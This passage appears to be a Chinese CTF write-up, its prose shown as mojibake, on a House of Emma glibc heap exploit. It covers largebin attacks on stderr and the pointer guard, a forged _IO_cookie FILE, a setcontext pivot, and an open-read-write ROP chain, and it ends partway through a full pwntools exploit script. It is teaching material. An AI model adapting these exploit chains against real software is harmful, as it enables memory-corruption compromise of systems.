attack"></a>Â†ÜÂ∏ÉÂ±Ä‰∏élargbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#Ëé∑ÂèñlibcÂü∫ÂùÄ</span></span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + <span class="number">0x3c0740</span> + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure><p>freeÊéâ‰ªªÊÑè‰∏Ä‰∏™unsorted binÂèØËé∑ÂèñlibcÂü∫ÂùÄ</p><blockquote><p>ÈóÆÈ¢òÔºöËøôÈáåÁöÑchunk 0‰∏∫‰ªÄ‰πàËÉΩ‰øùÊåÅÂú®unsorted bin‰∏≠ÔºåËÄåÊ≤°ÊúâÂú®Âæ™ÁéØÂºÄÂßãmalloc0x2000Êó∂ÊîæÂÖ•large binÔºü</p><p>Âõ†‰∏∫chunk 0Âíå0x2000Á¥ßÈÇªÔºåÊØèÊ¨°ÂÆåÊàêÂæ™ÁéØÈÉΩ‰ºöËß¶ÂèëÂêàÂπ∂ÔºåÂπ∂Âú®ÂàÜÈÖçÊó∂Ë¢´Âàá‰∏ãÊù•</p></blockquote><p>ÊûÑÈÄ†0&lt;2ÔºåfreeÊéâÂêéÁî≥ËØ∑‰∏ÄÂùóËæÉÂ∞èÁöÑchunkÔºåÂ∞Ü2ÊîæÂÖ•largebin‰ª•Ëé∑ÂèñheapÂü∫ÂùÄ</p><p>Ê≥®ÊÑèËæìÂá∫Â≠òÂú®Êà™Êñ≠ÔºåÂèØ‰ª•ÂÖàÊää2ÁöÑfd,bkÈÉ®ÂàÜÂ°´Êª°Ôºå‰∫ãÂêéËÆ∞ÂæóË¶Å‰øÆÂ§ç</p><p>Ê≥®ÊÑèlargbinÂ§ßÂ∞è0x440~0x480‰∏∫‰∏Ä‰∏™ËåÉÂõ¥Ôºå‰∏∫ÂêéÁª≠largebin attackËµ∑ËßÅÔºåÂ∫îÊ≥®ÊÑèÈ¢ÑÁïôÂ§ßÂ∞è</p><h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attackÁöÑÂà©Áî®ÊñπÂºèÔºö</p><ol><li>Â∞Ü‰∏Ä‰∏™ËæÉÂ§ßÁöÑ„ÄÅlargebin‰∏≠ÁöÑchunkÁöÑbk_nextsizeË¶ÜÁõñ‰∏∫[target-0x20]</li><li>Â∞Ü‰∏Ä‰∏™ËæÉÂ∞èÁöÑchunkÊîæÂÖ•<strong>Âêå‰∏Ä‰∏™</strong>largebinÔºåËß¶Âèëunlink</li><li>Ê≠§Êó∂[target]ÁöÑÂÜÖÂÆπË¢´‰øÆÊîπ‰∏∫ËæÉÂ∞èchunkÁöÑÂú∞ÂùÄ</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)<span class="comment">#ÊûÑÈÄ†ÁöÑÂêåÊó∂È°∫‰æø‰øÆÂ§ç</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>Â∞Ü5freeÊéâÔºåÊîæÂÖ•largebinÔºåÊâìÂá∫‰∏ÄÊ¨°attackÔºå‰øÆÊîπstderr</p><p>ÂèàÈÄöËøá7Â∞Ü5Áî≥ËØ∑ÂõûÊù•ÔºåÔºàËøôÈáåÁî≥ËØ∑‰πãÂâçÊ≤°Êúâ‰øÆÂ§çÔºåÂØºËá¥stderrÊåáÂêë‰∫Ü2Ôºâ</p><p>ÈöèÂêéÂÜçÊõ¥Êîπ2ÔºåÂÜçfreeÊéâ7Ôºà5ÔºâÔºåÊâìÂá∫Á¨¨‰∫åÊ¨°attackÔºå‰øÆÊîπpoint_guard</p><h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>ËØ•ÂÄºÂ≠òÂú®‰∫éfs:0x30</p><p>tlsÂü∫ÂùÄÊü•ÁúãÊñπÂºè‰∏∫<code>fsbase</code>Êàñ<code>tls</code>Ôºàpwngdb)ÔºåÂä†‰∏ä0x30Âç≥‰∏∫guardÂÄº</p><p>‰πüÂèØ‰ª•Áõ¥Êé•Áî®gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0</span> </span><br><span class="line">(gdb) x /gx $rsp - 0x8</span><br><span class="line">0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE</span><br></pre></td></tr></table></figure><p>Êú¨Âú∞gdbË∞ÉËØïÊó∂ËØ•ÂÄº‰∏élibcÂÅèÁßªÂèØËÉΩÊîπÂèòÔºåË∞ÉËØïÊó∂ÂèØ‰ª•ÂÖàÂÖ≥Èó≠aslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h3 id="‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë-malloc-assert"><a href="#‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë-malloc-assert" class="headerlink" title="‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë__malloc_assert"></a>‰øÆÂ§çlargebin‰∏éÂáÜÂ§áËß¶Âèë__malloc_assert</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>ÂÖàÂàÜÂà´‰øÆË°•‰∏§‰∏™largebinÔºåÈò≤Ê≠¢ÂàÜÈÖçÊó∂ÂèëÁîüÈîôËØØ</p><p>Áî≥ËØ∑8Â°´Ë°•5,Áî≥ËØ∑9Â°´Ë°•2</p><p>Â∞ÜÊúÄÂ§ñÂ±ÇÁöÑchunk 6 freeÊéâÔºåÂä†ÂÖ•unsorted binÂπ∂‰∏étop chunkÂêàÂπ∂</p><p>ÂÜçÁî≥ËØ∑‰∏ÄÂùóÁï•Â∞è‰∫é6ÁöÑchunk 10ÔºåÈÄöËøá‰øÆÊîπchunk 6ÁöÑÂÜÖÂÆπ‰øÆÊîπtop chunkÁöÑsizeÊÆµ</p><p>Ê≠§Â§ÑÊîπ‰∏∫0x10‰Ωø‰πãÈ°µ‰∏çÂØπÈΩê</p><p>ÂêéÈù¢Âè™ÈúÄË¶ÅÁî≥ËØ∑‰∏Ä‰∏™chunkÂ∞±ÂèØ‰ª•Ëß¶Âèë<code>__malloc_assert</code></p><h2 id="ÊûÑÈÄ†IOÂà©Áî®Èìæ"><a href="#ÊûÑÈÄ†IOÂà©Áî®Èìæ" class="headerlink" title="ÊûÑÈÄ†IOÂà©Áî®Èìæ"></a>ÊûÑÈÄ†IOÂà©Áî®Èìæ</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>ÂÅáËÆæÊàë‰ª¨ÊéßÂà∂‰∫Ü<code>stderr</code>ÔºåËøõÂÖ•‰∫Ü<code>_IO_cookie_write</code>ÔºåË∞ÉÁî®ÂáΩÊï∞ÊåáÈíà<code>write_cb</code>ÔºåÊ≠§Êó∂Êàë‰ª¨Âè™ËÉΩÊéßÂà∂ËøõÂÖ•ÂáΩÊï∞Êó∂ÁöÑ<code>rdi</code>ÔºåËÄåÊéßÂà∂<code>setcontext</code>ÈúÄË¶ÅÊéßÂà∂rdx</p><p>Á¢∞Â∑ßÊúâ‰∏Ä‰∏™gadgetÔºåËÉΩÂ§üÂà©Áî®<code>rdi</code>ÊéßÂà∂<code>rdx</code>ÔºåËøòËÉΩcall‰∏Ä‰∏™Âíå<code>rdx</code>Áõ∏ÂÖ≥ÁöÑÂú∞ÂùÄ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br></pre></td></tr></table></figure><h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>ËøõÂÖ•<code>__malloc_assert</code>ÂêéÔºåÂà©Áî®<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>Ë∞ÉÁî®Èìæ</p><p>ÈúÄË¶ÅÊª°Ë∂≥<code>_IO_write_ptr &gt; _IO_write_base</code>Ôºå‰∏î<code>_lock</code>ÊåáÂêëÂèØÂÜôÂú∞ÂùÄÔºåÊ≠§Â§ÑÁõ¥Êé•‰ΩøÁî®ÂéüÂú∞ÂùÄ<code>_IO_stdfile_2_lock</code></p><p><code>vtable</code>ÈúÄË¶Å‰º™ÈÄ†ÔºåËß¶ÂèëIOÊó∂ÔºåÂéüÊú¨ÊåáÂêë<code>_IO_file_jumps -&gt; __xsputn</code>ÔºåÂç≥<code>&lt;__GI__IO_file_jumps+56&gt;</code>ÔºåÈúÄË¶Å‰º™ÈÄ†‰∏∫<code>_IO_cookie_jumps-&gt; __write</code>ÔºåÂç≥<code>&lt;_IO_cookie_jumps+120&gt;</code>ÔºåÊïÖÊ≠§Â§ÑÂ°´‰∏ä<code>_IO_cookie_jumps+0x40</code></p><p>ÊûÑÈÄ†<code>__cookie</code>‰∏∫chunk 0ÁöÑÂú∞ÂùÄÔºåÊ≥®ÊÑè‰∏∫‰∫ÜÊñπ‰æøÊõ¥ÊîπÔºåÂú∞ÂùÄÂä†‰∏ä0x10Ôºå‰πãÂêéchunk 0ÁöÑÁî®Êà∑Âú∞ÂùÄ‰ºöËøõÂÖ•<code>rdi</code></p><p>ÊûÑÈÄ†<code>cookie_write_function_t *write</code>Â§ÑÊåáÈíà‰∏∫gadgetÂú∞ÂùÄÔºåË∞ÉÁî®Êó∂Áõ¥Êé•ËøêË°ågadgetÔºåÊ≠§Â§ÑÊúâÂä†ÂØÜ</p><h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>‰øÆÊîπchunk 0Ôºå‰ΩørdxÊåáÂêëchunk5</p><h3 id="Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext"><a href="#Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext" class="headerlink" title="Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext"></a>Â∏ÉÁΩÆrdxÈôÑËøëÊª°Ë∂≥setcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>Ê†πÊçÆsetcontext+61ÔºåÂ∏ÉÁΩÆ<code>rdx</code>Âë®Âõ¥Ôºå‰ΩøÂØÑÂ≠òÂô®Êª°Ë∂≥Êù°‰ª∂</p><p><code>rsp</code>ÊåáÂêëchunk 1Ôºå<code>rcx</code>ÊåáÂêëretÔºåÂ∞ÜÊ†àËøÅÁßªÂà∞chunk 1‰∏ä</p><h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line">tls_offset = <span class="number">0x3c0740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 